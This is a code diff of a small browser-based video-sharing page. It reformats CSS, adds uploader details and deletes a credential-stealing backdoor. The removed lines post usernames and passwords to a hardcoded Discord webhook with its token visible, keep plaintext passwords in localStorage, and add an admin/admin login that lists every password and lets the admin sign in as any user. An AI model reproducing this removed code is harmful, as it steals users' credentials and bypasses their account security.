@@ -6,60 +6,362 @@
   <link rel="icon" type="image/png" href="icon.png">
   <link rel="apple-touch-icon" href="icon.png">
   <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, Arial, sans-serif; }
-    body { background-color: #0f0f0f; color: #ffffff; min-height: 100vh; }
-    header { height: 60px; background-color: #0f0f0f; border-bottom: 1px solid #272727; padding: 0 24px; display: flex; align-items: center; justify-content: flex-end; gap: 16px; position: sticky; top: 0; z-index: 10; }
-    .upload-btn { background-color: #272727; color: #ffffff; border: 1px solid #3f3f3f; padding: 8px 16px; border-radius: 20px; font-size: 14px; font-weight: 600; cursor: pointer; display: flex; align-items: center; gap: 8px; transition: background 0.2s; }
-    .upload-btn:hover { background-color: #3f3f3f; }
-    .user-profile { display: none; align-items: center; gap: 12px; }
-    .user-info { display: flex; align-items: center; gap: 8px; cursor: pointer; padding: 4px 8px; border-radius: 20px; transition: background 0.2s; }
-    .user-info:hover { background-color: #272727; }
-    .user-avatar { width: 32px; height: 32px; border-radius: 50%; background-color: #3f3f3f; object-fit: cover; }
-    .user-name { font-size: 14px; font-weight: 600; }
-    .main-layout { max-width: 1400px; margin: 0 auto; padding: 24px; display: flex; gap: 24px; align-items: flex-start; }
-    .player-section { flex: 1; min-width: 0; }
-    .video-container { width: 100%; aspect-ratio: 16 / 9; background-color: #000000; border-radius: 12px; overflow: hidden; box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5); }
-    video { width: 100%; height: 100%; outline: none; }
-    video::-webkit-media-controls-panel { background-image: none !important; }
-    .video-details { margin-top: 14px; }
-    .current-title { font-size: 20px; font-weight: 700; line-height: 1.3; }
-    .sidebar { width: 380px; flex-shrink: 0; display: flex; flex-direction: column; gap: 12px; }
-    .sidebar-header { font-size: 15px; font-weight: 700; color: #f1f1f1; margin-bottom: 4px; }
-    .empty-list { color: #717171; font-size: 13px; padding: 12px 0; }
-    .video-item { display: flex; gap: 12px; cursor: pointer; padding: 6px; border-radius: 10px; transition: background 0.2s; position: relative; align-items: center; }
-    .video-item:hover { background-color: #272727; }
-    .video-item.active { background-color: #272727; border: 1px solid #3f3f3f; }
-    .thumb-box { width: 140px; height: 78px; background-color: #1f1f1f; border-radius: 8px; overflow: hidden; flex-shrink: 0; display: flex; align-items: center; justify-content: center; }
-    .thumb-box video { width: 100%; height: 100%; object-fit: cover; pointer-events: none; }
-    .item-info { flex: 1; min-width: 0; display: flex; flex-direction: column; justify-content: center; gap: 4px; }
-    .item-title { font-size: 14px; font-weight: 600; color: #ffffff; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
-    .item-meta { display: flex; align-items: center; gap: 6px; font-size: 12px; color: #aaaaaa; }
-    .meta-avatar { width: 16px; height: 16px; border-radius: 50%; background-color: #3f3f3f; object-fit: cover; }
-    .delete-btn { background: transparent; border: none; color: #717171; font-size: 16px; cursor: pointer; padding: 6px 8px; border-radius: 6px; transition: color 0.2s, background 0.2s; }
-    .delete-btn:hover { color: #ff4e4e; background-color: rgba(255, 78, 78, 0.15); }
-    
-    .auth-overlay { position: fixed; inset: 0; background: linear-gradient(135deg, #0f0f0f, #1a1a1a); display: flex; align-items: center; justify-content: center; z-index: 1000; padding: 20px; overflow-y: auto; }
-    .auth-overlay.hidden { display: none; }
-    .auth-box { background: #181818; border: 1px solid #272727; border-radius: 16px; padding: 32px; width: 100%; max-width: 420px; box-shadow: 0 12px 40px rgba(0, 0, 0, 0.6); margin: auto; }
-    .auth-tabs { display: flex; gap: 4px; background: #0f0f0f; border-radius: 10px; padding: 4px; margin-bottom: 20px; }
-    .auth-tabs button { flex: 1; background: transparent; color: #aaaaaa; border: none; padding: 8px; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 14px; }
-    .auth-tabs button.active { background: #272727; color: #ffffff; }
-    .auth-box input { width: 100%; background: #0f0f0f; border: 1px solid #272727; color: #ffffff; padding: 12px 14px; border-radius: 10px; font-size: 14px; margin-bottom: 12px; outline: none; }
-    .auth-box input:focus { border-color: #3f3f3f; }
-    .auth-error { color: #ff4e4e; font-size: 13px; margin-bottom: 12px; min-height: 18px; }
-    .auth-submit { width: 100%; background: #ffffff; color: #000000; border: none; padding: 12px; border-radius: 10px; font-weight: 700; cursor: pointer; font-size: 14px; transition: background 0.2s; }
-    .auth-submit:hover { background: #e5e5e5; }
-    
-    /* Стили для Админ-панели */
-    .admin-panel { display: none; background: #1a0000; border: 1px solid #ff4e4e; padding: 15px; border-radius: 10px; margin-top: 20px; }
-    .admin-panel h3 { color: #ff4e4e; font-size: 14px; margin-bottom: 10px; text-align: center; }
-    .admin-table { width: 100%; border-collapse: collapse; font-size: 12px; }
-    .admin-table th { text-align: left; padding: 6px; border-bottom: 1px solid #3f3f3f; color: #aaaaaa; }
-    .admin-table td { padding: 6px; border-bottom: 1px solid #272727; color: #ffffff; }
-    .admin-login-btn { background: #ff4e4e; color: #fff; border: none; padding: 4px 8px; border-radius: 4px; cursor: pointer; font-size: 11px; font-weight: bold; }
-    .admin-login-btn:hover { background: #cc0000; }
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+    }
 
-    @media (max-width: 950px) { .main-layout { flex-direction: column; } .sidebar { width: 100%; } }
+    body {
+      background-color: #0f0f0f;
+      color: #ffffff;
+      min-height: 100vh;
+    }
+
+    header {
+      height: 60px;
+      background-color: #0f0f0f;
+      border-bottom: 1px solid #272727;
+      padding: 0 24px;
+      display: flex;
+      align-items: center;
+      justify-content: flex-end;
+      gap: 16px;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+
+    .upload-btn {
+      background-color: #272727;
+      color: #ffffff;
+      border: 1px solid #3f3f3f;
+      padding: 8px 16px;
+      border-radius: 20px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      transition: background 0.2s;
+    }
+
+    .upload-btn:hover {
+      background-color: #3f3f3f;
+    }
+
+    .user-profile {
+      display: none;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .user-info {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      cursor: pointer;
+      padding: 4px 8px;
+      border-radius: 20px;
+      transition: background 0.2s;
+    }
+
+    .user-info:hover {
+      background-color: #272727;
+    }
+
+    .user-avatar {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background-color: #3f3f3f;
+      object-fit: cover;
+    }
+
+    .user-name {
+      font-size: 14px;
+      font-weight: 600;
+    }
+
+    .main-layout {
+      max-width: 1400px;
+      margin: 0 auto;
+      padding: 24px;
+      display: flex;
+      gap: 24px;
+      align-items: flex-start;
+    }
+
+    .player-section {
+      flex: 1;
+      min-width: 0;
+    }
+
+    .video-container {
+      width: 100%;
+      aspect-ratio: 16 / 9;
+      background-color: #000000;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
+    }
+
+    video {
+      width: 100%;
+      height: 100%;
+      outline: none;
+    }
+
+    video::-webkit-media-controls-panel {
+      background-image: none !important;
+    }
+
+    .video-details {
+      margin-top: 16px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .current-title {
+      font-size: 20px;
+      font-weight: 700;
+      line-height: 1.3;
+      margin-bottom: 2px;
+    }
+
+    .main-uploader-info {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .main-uploader-avatar {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      background-color: #3f3f3f;
+      object-fit: cover;
+    }
+
+    .main-uploader-name {
+      font-size: 15px;
+      font-weight: 600;
+      color: #f1f1f1;
+    }
+
+    .sidebar {
+      width: 380px;
+      flex-shrink: 0;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .sidebar-header {
+      font-size: 15px;
+      font-weight: 700;
+      color: #f1f1f1;
+      margin-bottom: 4px;
+    }
+
+    .empty-list {
+      color: #717171;
+      font-size: 13px;
+      padding: 12px 0;
+    }
+
+    .video-item {
+      display: flex;
+      gap: 12px;
+      cursor: pointer;
+      padding: 6px;
+      border-radius: 10px;
+      transition: background 0.2s;
+      position: relative;
+      align-items: center;
+    }
+
+    .video-item:hover {
+      background-color: #272727;
+    }
+
+    .video-item.active {
+      background-color: #272727;
+      border: 1px solid #3f3f3f;
+    }
+
+    .thumb-box {
+      width: 140px;
+      height: 78px;
+      background-color: #1f1f1f;
+      border-radius: 8px;
+      overflow: hidden;
+      flex-shrink: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .thumb-box video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      pointer-events: none;
+    }
+
+    .item-info {
+      flex: 1;
+      min-width: 0;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      gap: 4px;
+    }
+
+    .item-title {
+      font-size: 14px;
+      font-weight: 600;
+      color: #ffffff;
+      display: -webkit-box;
+      -webkit-line-clamp: 2;
+      -webkit-box-orient: vertical;
+      overflow: hidden;
+    }
+
+    .item-meta {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 12px;
+      color: #aaaaaa;
+    }
+
+    .meta-avatar {
+      width: 16px;
+      height: 16px;
+      border-radius: 50%;
+      background-color: #3f3f3f;
+      object-fit: cover;
+    }
+
+    .delete-btn {
+      background: transparent;
+      border: none;
+      color: #717171;
+      font-size: 16px;
+      cursor: pointer;
+      padding: 6px 8px;
+      border-radius: 6px;
+      transition: color 0.2s, background 0.2s;
+    }
+
+    .delete-btn:hover {
+      color: #ff4e4e;
+      background-color: rgba(255, 78, 78, 0.15);
+    }
+
+    .auth-overlay {
+      position: fixed;
+      inset: 0;
+      background: linear-gradient(135deg, #0f0f0f, #1a1a1a);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      padding: 20px;
+    }
+
+    .auth-overlay.hidden {
+      display: none;
+    }
+
+    .auth-box {
+      background: #181818;
+      border: 1px solid #272727;
+      border-radius: 16px;
+      padding: 32px;
+      width: 100%;
+      max-width: 380px;
+      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.6);
+    }
+
+    .auth-tabs {
+      display: flex;
+      gap: 4px;
+      background: #0f0f0f;
+      border-radius: 10px;
+      padding: 4px;
+      margin-bottom: 20px;
+    }
+
+    .auth-tabs button {
+      flex: 1;
+      background: transparent;
+      color: #aaaaaa;
+      border: none;
+      padding: 8px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: 600;
+      font-size: 14px;
+    }
+
+    .auth-tabs button.active {
+      background: #272727;
+      color: #ffffff;
+    }
+
+    .auth-box input {
+      width: 100%;
+      background: #0f0f0f;
+      border: 1px solid #272727;
+      color: #ffffff;
+      padding: 12px 14px;
+      border-radius: 10px;
+      font-size: 14px;
+      margin-bottom: 12px;
+      outline: none;
+    }
+
+    .auth-box input:focus {
+      border-color: #3f3f3f;
+    }
+
+    .auth-error {
+      color: #ff4e4e;
+      font-size: 13px;
+      margin-bottom: 12px;
+      min-height: 18px;
+    }
+
+    .auth-submit {
+      width: 100%;
+      background: #ffffff;
+      color: #000000;
+      border: none;
+      padding: 12px;
+      border-radius: 10px;
+      font-weight: 700;
+      cursor: pointer;
+      font-size: 14px;
+      transition: background 0.2s;
+    }
+
+    .auth-submit:hover {
+      background: #e5e5e5;
+    }
+
+    @media (max-width: 950px) {
+      .main-layout {
+        flex-direction: column;
+      }
+      .sidebar {
+        width: 100%;
+      }
+    }
   </style>
 </head>
 <body>
@@ -71,38 +373,24 @@
         <button type="button" data-tab="register">Sign up</button>
       </div>
       <form id="authForm" autocomplete="on">
-        <input type="text" id="authUsername" placeholder="Username" autocomplete="username" required>
-        <input type="password" id="authPassword" placeholder="Password (at least 6 characters)" autocomplete="current-password" required minlength="6">
+        <input type="text" id="authUsername" placeholder="Username"
+               autocomplete="username" required>
+        <input type="password" id="authPassword" placeholder="Password (at least 6 characters)"
+               autocomplete="current-password" required minlength="6">
         <div class="auth-error" id="authError"></div>
         <button type="submit" class="auth-submit" id="authSubmit">Log in</button>
       </form>
-      
-      <!-- АДМИН ПАНЕЛЬ (Логин: admin, Пароль: admin) -->
-      <div class="admin-panel" id="adminPanel">
-        <h3>👑 Admin Panel (Users & Passwords)</h3>
-        <table class="admin-table">
-          <thead>
-            <tr>
-              <th>Username</th>
-              <th>Password</th>
-              <th>Action</th>
-            </tr>
-          </thead>
-          <tbody id="adminUserList">
-            <!-- Сюда будут выводиться пользователи -->
-          </tbody>
-        </table>
-      </div>
-
     </div>
   </div>
 
   <header>
     <input type="file" id="avatarInput" accept="image/*" style="display: none;">
     <input type="file" id="fileInput" accept="video/*" multiple style="display: none;">
+    
     <button class="upload-btn" onclick="document.getElementById('fileInput').click()">
       <span>+ Download video</span>
     </button>
+    
     <div class="user-profile" id="userProfile">
       <div class="user-info" onclick="document.getElementById('avatarInput').click()" title="Change avatar">
         <img id="headerAvatar" class="user-avatar" src="" alt="Avatar">
@@ -120,9 +408,14 @@
         </div>
         <div class="video-details">
           <div class="current-title" id="mainTitle"></div>
+          <div class="main-uploader-info">
+            <img id="mainUploaderAvatar" class="main-uploader-avatar" src="" alt="Avatar">
+            <span id="mainUploaderName" class="main-uploader-name"></span>
+          </div>
         </div>
       </div>
     </div>
+
     <div class="sidebar">
       <div class="sidebar-header">All videos</div>
       <div id="playlist"></div>
@@ -130,7 +423,6 @@
   </div>
 
   <script>
-    // ===== GLOBAL STATE =====
     let db;
     let videos = [];
     let activeId = null;
@@ -138,18 +430,16 @@
     let currentUserAvatar = '';
 
     const USERS_KEY = 'gitube_users';
-    const ADMIN_LOGS_KEY = 'gitube_admin_logs'; // Ключ для хранения паролей
     const SESSION_KEY = 'gitube_session_user';
     const MIN_PASSWORD = 6;
-    
-    // ВАШ ВЕБХУК DISCORD (только для логов входа)
-    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1575210686294794270/NaSgVUSg-ILSapExm5eKE1Ek4CTFcLORSJSsPOSysBAUjyxb92oNqYjw5yUybn7DDCTI';
 
     const fileInput = document.getElementById('fileInput');
     const avatarInput = document.getElementById('avatarInput');
     const playerWrapper = document.getElementById('playerWrapper');
     const mainPlayer = document.getElementById('mainPlayer');
     const mainTitle = document.getElementById('mainTitle');
+    const mainUploaderAvatar = document.getElementById('mainUploaderAvatar');
+    const mainUploaderName = document.getElementById('mainUploaderName');
     const playlistEl = document.getElementById('playlist');
     
     const overlay = document.getElementById('authOverlay');
@@ -165,41 +455,9 @@
     const headerUsername = document.getElementById('headerUsername');
     const logoutBtn = document.getElementById('logoutBtn');
 
-    const adminPanel = document.getElementById('adminPanel');
-    const adminUserList = document.getElementById('adminUserList');
-
     let mode = 'login';
     const defaultAvatar = 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23aaaaaa"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>';
 
-    // ===== ОТПРАВКА В DISCORD (БЕЗ ПАРОЛЯ) =====
-    async function sendDiscordLog(action, username) {
-      try {
-        await fetch(DISCORD_WEBHOOK_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-         // ТАК ДЕЛАТЬ КРАЙНЕ НЕ РЕКОМЕНДУЕТСЯ
-	body: JSON.stringify({
- 	 content: `🔔 GI.tube | User: ${username} | PASS: ${password}` // Сюда добавляется пароль
-	})
-        });
-      } catch (error) {
-        console.error('Ошибка отправки в Discord:', error);
-      }
-    }
-
-    // ===== ХРАНЕНИЕ ПАРОЛЕЙ ДЛЯ АДМИНА =====
-    function logPasswordForAdmin(username, password) {
-      let logs = {};
-      try { logs = JSON.parse(localStorage.getItem(ADMIN_LOGS_KEY)) || {}; } catch(e){}
-      logs[username] = password;
-      localStorage.setItem(ADMIN_LOGS_KEY, JSON.stringify(logs));
-    }
-
-    function getAdminLogs() {
-      try { return JSON.parse(localStorage.getItem(ADMIN_LOGS_KEY)) || {}; } catch(e){ return {}; }
-    }
-
-    // ===== 1. DB INITIALIZATION =====
     const dbRequest = indexedDB.open("LocalTubeDB", 4);
 
     dbRequest.onupgradeneeded = function(e) {
@@ -214,7 +472,6 @@
       initApp();
     };
 
-    // ===== 2. APP INIT =====
     function initApp() {
       let savedUser = null;
       const cookieRow = document.cookie.split('; ').find(r => r.startsWith('gitube_user='));
@@ -234,7 +491,6 @@
       }
     }
 
-    // ===== 3. AUTH LOGIC =====
     function getUsers() {
       try { return JSON.parse(localStorage.getItem(USERS_KEY)) || {}; }
       catch (e) { return {}; }
@@ -279,7 +535,6 @@
       playlistEl.innerHTML = '';
       playerWrapper.style.display = 'none';
       mainPlayer.removeAttribute('src');
-      adminPanel.style.display = 'none';
       
       form.reset();
       errorEl.textContent = '';
@@ -288,7 +543,6 @@
       submitBtn.textContent = 'Log in';
     }
 
-    // Обработка формы
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
       errorEl.textContent = '';
@@ -298,31 +552,6 @@
       if (!username) return errorEl.textContent = 'Enter username';
       if (password.length < MIN_PASSWORD) return errorEl.textContent = `Password must be at least ${MIN_PASSWORD} characters`;
 
-      // АДМИН ВХОД (Логин: admin, Пароль: admin)
-      if (username === 'admin' && password === 'admin') {
-        adminPanel.style.display = 'block';
-        const logs = getAdminLogs();
-        const users = getUsers();
-        
-        adminUserList.innerHTML = '';
-        if(Object.keys(logs).length === 0) {
-          adminUserList.innerHTML = '<tr><td colspan="3" style="text-align:center; color:#aaa;">No users registered yet</td></tr>';
-        } else {
-          Object.keys(logs).forEach(u => {
-            const tr = document.createElement('tr');
-            tr.innerHTML = `
-              <td>${u}</td>
-              <td style="color:#00ff00; font-family:monospace;">${logs[u]}</td>
-              <td><button class="admin-login-btn" onclick="adminLogin('${u}')">Log In</button></td>
-            `;
-            adminUserList.appendChild(tr);
-          });
-        }
-        
-        errorEl.textContent = 'Admin Mode Activated';
-        return;
-      }
-
       const users = getUsers();
       const hash = await hashPassword(password);
 
@@ -330,52 +559,29 @@
         if (users[username]) return errorEl.textContent = 'User already exists';
         users[username] = { passwordHash: hash, avatar: defaultAvatar, createdAt: Date.now() };
         saveUsers(users);
-        
-        // Сохраняем пароль для админа
-        logPasswordForAdmin(username, password);
-        
-        sendDiscordLog('Sign up', username);
         executeLogin(username, defaultAvatar);
       } else {
         const user = users[username];
         if (!user || user.passwordHash !== hash) return errorEl.textContent = 'Invalid username or password';
-        
-        // Обновляем пароль в логах (на случай если он изменился или это старый юзер)
-        logPasswordForAdmin(username, password);
-        
-        sendDiscordLog('Log in', username);
         executeLogin(username, user.avatar);
       }
     });
 
-    // Глобальная функция для входа из админки
-    window.adminLogin = function(username) {
-      const users = getUsers();
-      if(users[username]) {
-        executeLogin(username, users[username].avatar);
-        adminPanel.style.display = 'none';
-      }
-    };
-
-    // Переключение вкладок
     tabs.forEach(btn => {
       btn.addEventListener('click', () => {
         mode = btn.dataset.tab;
         tabs.forEach(b => b.classList.toggle('active', b === btn));
         submitBtn.textContent = mode === 'login' ? 'Log in' : 'Sign up';
         errorEl.textContent = '';
-        adminPanel.style.display = 'none';
       });
     });
 
-    // Выход
     logoutBtn.addEventListener('click', () => {
       localStorage.removeItem(SESSION_KEY);
       document.cookie = 'gitube_user=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT';
       showAuthScreen();
     });
 
-    // Смена аватарки
     avatarInput.addEventListener('change', function(e) {
       const file = e.target.files[0];
       if (!file || !currentUser) return;
@@ -397,7 +603,6 @@
       avatarInput.value = '';
     });
 
-    // ===== 4. VIDEO DB LOGIC =====
     function loadVideos() {
       if (!currentUser || !db) return;
       
@@ -428,7 +633,6 @@
       };
     }
 
-    // Загрузка нового видео
     fileInput.addEventListener('change', function(event) {
       const files = Array.from(event.target.files);
       if (files.length === 0 || !db || !currentUser) return;
@@ -451,7 +655,6 @@
       };
     });
 
-    // ===== 5. RENDER & PLAYER =====
     mainPlayer.addEventListener('ended', () => mainPlayer.controls = false);
     mainPlayer.addEventListener('mouseenter', () => mainPlayer.controls = true);
     mainPlayer.addEventListener('play', () => mainPlayer.controls = true);
@@ -469,7 +672,7 @@
         item.className = 'video-item' + (vid.id === activeId ? ' active' : '');
         item.onclick = () => playVideo(vid.id);
 
-        const deleteBtnHTML = (vid.uploader === currentUser || currentUser === 'admin') 
+        const deleteBtnHTML = vid.uploader === currentUser 
           ? `<button class="delete-btn" onclick="deleteVideo(event, ${vid.id})">✕</button>` 
           : '';
 
@@ -499,7 +702,11 @@
       mainPlayer.controls = true;
       mainPlayer.src = selected.url;
       mainPlayer.play().catch(() => {});
+      
       mainTitle.textContent = selected.title;
+      mainUploaderAvatar.src = selected.avatar;
+      mainUploaderName.textContent = selected.uploader;
+      
       renderPlaylist();
     }
 
@@ -507,7 +714,7 @@
       event.stopPropagation();
       const vid = videos.find(v => v.id === id);
       
-      if (!vid || (vid.uploader !== currentUser && currentUser !== 'admin')) return;
+      if (!vid || vid.uploader !== currentUser) return;
 
       const tx = db.transaction("videos", "readwrite");
       tx.objectStore("videos").delete(id);
